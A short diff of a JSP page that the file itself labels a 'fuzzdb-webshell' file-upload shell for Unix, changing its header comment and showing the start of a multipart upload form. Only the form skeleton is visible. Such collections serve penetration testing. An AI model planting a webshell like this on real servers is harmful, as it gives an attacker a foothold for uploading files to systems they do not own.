@@ -1,8 +1,6 @@
 <jsp:useBean id="prop" scope="page" class="java.util.Properties" />
 <%@ page import="java.io.*,java.util.*,javax.servlet.*" %>
-<%
-// up.jsp = File Upload (unix)
-%>
+<%-- from fuzzdb-webshell - File Upload (unix)--%>
 <html>
 <form name="test" method="post" action="" enctype="multipart/form-data">
 <input type="File" name="fichero">
